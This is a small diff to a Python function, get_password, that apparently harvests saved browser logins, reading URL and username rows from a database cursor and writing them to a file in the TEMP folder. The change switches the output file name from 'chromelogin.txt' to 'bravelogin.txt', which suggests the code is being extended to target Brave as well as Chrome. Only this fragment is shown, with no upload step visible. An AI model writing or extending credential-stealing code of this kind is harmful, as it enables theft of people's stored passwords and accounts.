@@ -67,7 +67,7 @@ def get_password():
         if not bothInstalled():
             w = open(TEMP + r"\login.txt", "w+")
         else:
-            w = open(TEMP + r"\chromelogin.txt", "w+")
+            w = open(TEMP + r"\bravelogin.txt", "w+")
         for r in cursor.fetchall():
             url = r[0]
             username = r[1]
